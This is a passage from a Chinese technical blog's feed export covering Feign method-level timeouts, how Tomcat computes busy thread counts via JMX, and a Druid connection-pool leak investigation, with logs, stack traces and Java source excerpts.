c.n.loadbalancer.BaseLoadBalancer-472  - LoadBalancer [user-center_defaultzone]: clearing server list (SET op)</span><br><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.loadbalancer.BaseLoadBalancer-488  - LoadBalancer [user-center_defaultzone]:  addServer [192.168.16.211:10020]</span><br><span class="line">13:55:21.600 [main] DEBUG c.n.l.ZoneAwareLoadBalancer-112  - Zone aware logic disabled or there is only one zone</span><br><span class="line">13:55:21.633 [main] DEBUG c.n.loadbalancer.LoadBalancerContext-492  - user-center using LB returned Server: 192.168.16.211:10020 <span class="keyword">for</span> request http:///personalMember/getEffectiveMebIds</span><br><span class="line">13:55:21.741 [main] DEBUG c.n.l.reactive.LoadBalancerCommand-314  - Got error java.net.SocketTimeoutException: connect timed out when executed on server 192.168.16.211:10020</span><br><span class="line">13:55:22.253 [main] DEBUG c.n.l.ZoneAwareLoadBalancer-112  - Zone aware logic disabled or there is only one zone</span><br><span class="line">13:55:22.254 [main] DEBUG c.n.loadbalancer.LoadBalancerContext-492  - user-center using LB returned Server: 192.168.16.211:10020 <span class="keyword">for</span> request http:///personalMember/getEffectiveMebIds</span><br><span class="line">13:55:22.358 [main] DEBUG c.n.l.reactive.LoadBalancerCommand-314  - Got error java.net.SocketTimeoutException: connect timed out when executed on server 192.168.16.211:10020</span><br><span class="line"></span><br><span class="line">feign.RetryableException: connect timed out executing POST http://user-center/personalMember/getEffectiveMebIds</span><br><span class="line"></span><br><span class="line">at feign.FeignException.errorExecuting(FeignException.java:249)</span><br><span class="line">at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:129)</span><br><span class="line">at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89)</span><br><span class="line">at feign.ReflectiveFeign<span class="variable">$FeignInvocationHandler</span>.invoke(ReflectiveFeign.java:100)</span><br><span class="line">at com.sun.proxy.<span class="variable">$Proxy36</span>.getEffectiveMebIds(Unknown Source)</span><br></pre></td></tr></table></figure><p>直接超时了，说明这个限制生效了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/2020/04/28/feign-method-timeout/image-20200428135947174.png&quot;&gt;
&lt;h2 id=&quot;Feign方法级别的超时&quot;&gt;&lt;a href=&quot;#Feign方法级别的超时&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="feign" scheme="http://qsli.github.io/categories/feign/"/>
    
    
      <category term="spring-cloud" scheme="http://qsli.github.io/tags/spring-cloud/"/>
    
  </entry>
  
  <entry>
    <title>tomcat busy thread如何统计的</title>
    <link href="http://qsli.github.io/2020/04/27/tomcat-busy-thread/"/>
    <id>http://qsli.github.io/2020/04/27/tomcat-busy-thread/</id>
    <published>2020-04-27T05:59:37.000Z</published>
    <updated>2020-04-27T05:59:37.209Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tomcat-busy-thread"><a href="#tomcat-busy-thread" class="headerlink" title="tomcat busy thread"></a>tomcat busy thread</h2><p>突然好奇tomcat的busy thread怎么统计的，翻了下代码。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.tomcat.util.net.AbstractEndpoint#getCurrentThreadsBusy   </span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the amount of threads that are in use</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the amount of threads that are in use</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCurrentThreadsBusy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (executor!=<span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (executor <span class="keyword">instanceof</span> ThreadPoolExecutor) &#123;</span><br><span class="line">      <span class="keyword">return</span> ((ThreadPoolExecutor)executor).getActiveCount();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (executor <span class="keyword">instanceof</span> ResizableExecutor) &#123;</span><br><span class="line">      <span class="keyword">return</span> ((ResizableExecutor)executor).getActiveCount();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是在执行任务的线程跟线程的状态没有关系：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.util.concurrent.ThreadPoolExecutor#getActiveCount</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the approximate number of threads that are actively</span></span><br><span class="line"><span class="comment">     * executing tasks.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the number of threads</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getActiveCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">  mainLock.lock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">      <span class="keyword">if</span> (w.isLocked())</span><br><span class="line">        ++n;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    mainLock.unlock();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> MBeanServer server = ManagementFactory.getPlatformMBeanServer();</span><br><span class="line">Set&lt;ObjectName&gt; names = server.queryNames(<span class="keyword">new</span> ObjectName(<span class="string">"Catalina:type=ThreadPool,*"</span>), <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">final</span> ObjectName name : names) &#123;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    <span class="keyword">final</span> Object maxThreads = server.getAttribute(name, <span class="string">"maxThreads"</span>);</span><br><span class="line">    <span class="keyword">final</span> Object currentThreadCount = server.getAttribute(name, <span class="string">"currentThreadCount"</span>);</span><br><span class="line">    <span class="keyword">final</span> Object currentThreadsBusy = server.getAttribute(name, <span class="string">"currentThreadsBusy"</span>);</span><br><span class="line">    System.out.println(<span class="string">"maxThreads = "</span> + maxThreads);</span><br><span class="line">    System.out.println(<span class="string">"currentThreadCount = "</span> + currentThreadCount);</span><br><span class="line">    System.out.println(<span class="string">"currentThreadsBusy = "</span> + currentThreadsBusy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Catalina:<span class="built_in">type</span>=ThreadPool,name=<span class="string">"ajp-nio-8009"</span></span><br><span class="line">maxThreads = 200</span><br><span class="line">currentThreadCount = 10</span><br><span class="line">currentThreadsBusy = 0</span><br><span class="line">Catalina:<span class="built_in">type</span>=ThreadPool,name=<span class="string">"http-nio-8080"</span></span><br><span class="line">maxThreads = 200</span><br><span class="line">currentThreadCount = 10</span><br><span class="line">currentThreadsBusy = 0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tomcat-busy-thread&quot;&gt;&lt;a href=&quot;#tomcat-busy-thread&quot; class=&quot;headerlink&quot; title=&quot;tomcat busy thread&quot;&gt;&lt;/a&gt;tomcat busy thread&lt;/h2&gt;&lt;p&gt;突然好奇to
      
    
    </summary>
    
      <category term="tomcat" scheme="http://qsli.github.io/categories/tomcat/"/>
    
    
      <category term="busy-thread" scheme="http://qsli.github.io/tags/busy-thread/"/>
    
  </entry>
  
  <entry>
    <title>Druid连接泄露记录</title>
    <link href="http://qsli.github.io/2020/04/25/druid-conn-leak/"/>
    <id>http://qsli.github.io/2020/04/25/druid-conn-leak/</id>
    <published>2020-04-25T12:36:21.000Z</published>
    <updated>2020-04-25T12:36:21.334Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>当时数据库需要升级配置，已知中间会有闪断，按照之前的经验都是自动重连然后恢复。但是，这次tomcat的连接线程全部变成busy，导致应用不能提供服务。线程栈如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"http-nio-11022-exec-196"</span> <span class="comment">#216701 daemon prio=5 os_prio=0 tid=0x00007fbac4082000 nid=0x3c4a waiting on condition [0x00007fba0fb52000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00007fbb318710f0&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.takeLast(DruidDataSource.java:1899)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnectionInternal(DruidDataSource.java:1460)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnectionDirect(DruidDataSource.java:1255)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5007)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.logging.LogFilter.dataSource_getConnection(LogFilter.java:876)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1233)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1225)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:90)</span><br><span class="line">at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:140)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.getConnection(SpringManagedTransaction.java:68)</span><br><span class="line">at com.atour.migrate.helper.mybatis.interceptor.MyBatisMigrateChainIdKiller.checkDsIgnoreTableStatus(MyBatisMigrateChainIdKiller.java:181)</span><br></pre></td></tr></table></figure><p>查看jstack的输出发现连接线程都卡在了<code>DruidDataSource.java:1899</code>， 代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DruidConnectionHolder <span class="title">takeLast</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException, SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">while</span> (poolingCount == <span class="number">0</span>) &#123;</span><br><span class="line">               emptySignal(); <span class="comment">// send signal to CreateThread create connection</span></span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (failFast &amp;&amp; failContinuous.get()) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceNotAvailableException(createError);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               notEmptyWaitThreadCount++;</span><br><span class="line">               <span class="keyword">if</span> (notEmptyWaitThreadCount &gt; notEmptyWaitThreadPeak) &#123;</span><br><span class="line">                   notEmptyWaitThreadPeak = notEmptyWaitThreadCount;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="comment">// DruidDataSource.java:1899 卡在这里</span></span><br><span class="line">                   notEmpty.await(); <span class="comment">// signal by recycle or creator</span></span><br><span class="line">               &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                   notEmptyWaitThreadCount--;</span><br><span class="line">               &#125;</span><br><span class="line">               notEmptyWaitCount++;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (!enable) &#123;</span><br><span class="line">                   connectErrorCountUpdater.incrementAndGet(<span class="keyword">this</span>);</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceDisableException();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">           notEmpty.signal(); <span class="comment">// propagate to non-interrupted thread</span></span><br><span class="line">           notEmptySignalCount++;</span><br><span class="line">           <span class="keyword">throw</span> ie;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       decrementPoolingCount();</span><br><span class="line">       DruidConnectionHolder last = connections[poolingCount];</span><br><span class="line">       connections[poolingCount] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> last;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>等待在druid的notEmpty队里上，等待有可用的连接。找到对应的创建连接线程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Druid-ConnectionPool-Create-219971169"</span> <span class="comment">#80 daemon prio=5 os_prio=0 tid=0x00007fbab2fce000 nid=0x67e0 waiting on condition [0x00007fba2b974000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00007fbb31048098&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource<span class="variable">$CreateConnectionThread</span>.run(DruidDataSource.java:2448)</span><br><span class="line"></span><br><span class="line">   Locked ownable synchronizers:</span><br><span class="line">- None</span><br></pre></td></tr></table></figure><p>对应的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防止创建超过maxActive数量的连接</span></span><br><span class="line"><span class="keyword">if</span> (activeCount + poolingCount &gt;= maxActive) &#123;</span><br><span class="line">  <span class="comment">// DruidDataSource.java:2448</span></span><br><span class="line">  empty.await();</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>奇怪的是，创建连接的线程在等待empty的条件。问题可能就出在<code>activeCount + poolingCount &gt;= maxActive</code>这个条件上，其他线程都在等待连接，所以<code>poolingCount</code>肯定是0（连接池里没有空闲的连接），那么有问题的肯定是<code>activeCount</code>这里了。</p><p>第一反应是<code>druid</code>的bug，去github的issue上找了好久也没有找到类似的bug，只能再深入的挖掘系统的错误日志，最终还是找到了一些端倪。最初断开连接的时候出错日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">2020-04-09 17:32:29.321 ERROR [pms-provider-prod,cbcb523cffa38a5d,cbcb523cffa38a5d,<span class="literal">false</span>] --- [io-11022-exec-2] c.a.m.h.m.i.MyBatisMigrateChainIdKiller  : migrate.helper.MyBatisMigrateChainIdKillerError处理过程出现错误,</span><br><span class="line"></span><br><span class="line">org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: SQL Server 未返回响应。连接已关闭。</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:81)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.getConnection(SpringManagedTransaction.java:68)</span><br><span class="line">at com.atour.migrate.helper.mybatis.interceptor.MyBatisMigrateChainIdKiller.checkDsIgnoreTableStatus(MyBatisMigrateChainIdKiller.java:181)</span><br><span class="line">...</span><br><span class="line">Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: SQL Server 未返回响应。连接已关闭。</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.terminate(SQLServerConnection.java:1667)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.terminate(SQLServerConnection.java:1654)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSReader.readPacket(IOBuffer.java:4844)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(IOBuffer.java:6154)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(IOBuffer.java:6106)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection<span class="variable">$1ConnectionCommand</span>.doExecute(SQLServerConnection.java:1756)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectionCommand(SQLServerConnection.java:1761)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.setCatalog(SQLServerConnection.java:2063)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:750)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl.setCatalog(ConnectionProxyImpl.java:437)</span><br><span class="line">at com.alibaba.druid.pool.DruidPooledConnection.setCatalog(DruidPooledConnection.java:910)</span><br><span class="line">at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:143)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">... 131 common frames omitted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-04-09 17:32:43.701 ERROR [pms-provider-prod,,,] --- [reate-219971169] com.alibaba.druid.pool.DruidDataSource   : create connection SQLException, url: jdbc:sqlserver://xxx:3433;DatabaseName=xx, errorCode 0, state 08S01</span><br><span class="line"></span><br><span class="line">com.microsoft.sqlserver.jdbc.SQLServerException: 通过端口 1433 连接到主机 R8IC10364 的 TCP/IP 连接失败。错误:“null。请验证连接属性。确保 SQL Server 的实例正在主机上运行，且在此端口接受 TCP/IP 连接，还要确保防火墙没有阻止到此端口的 TCP 连接。”。</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:190)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerException.ConvertConnectExceptionToSQLServerException(SQLServerException.java:241)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SocketFinder.findSocket(IOBuffer.java:2243)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSChannel.open(IOBuffer.java:491)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectHelper(SQLServerConnection.java:1309)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-04-09 17:33:09.338 ERROR [pms-provider-prod,69497e80a3d973de,69497e80a3d973de,<span class="literal">false</span>] --- [io-11022-exec-9] c.a.m.h.m.i.MyBatisMigrateChainIdKiller  : migrate.helper.MyBatisMigrateChainIdKillerError处理过程出现错误,</span><br><span class="line"></span><br><span class="line">org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: Database <span class="string">'xxx'</span> cannot be opened. It is <span class="keyword">in</span> the middle of a restore.</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:81)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">...</span><br><span class="line">Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: Database <span class="string">'xxxx'</span> cannot be opened. It is <span class="keyword">in</span> the middle of a restore.</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:216)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSTokenHandler.onEOF(tdsparser.java:254)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSParser.parse(tdsparser.java:84)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSParser.parse(tdsparser.java:39)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection<span class="variable">$1ConnectionCommand</span>.doExecute(SQLServerConnection.java:1756)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)</span><br><span class="line">at 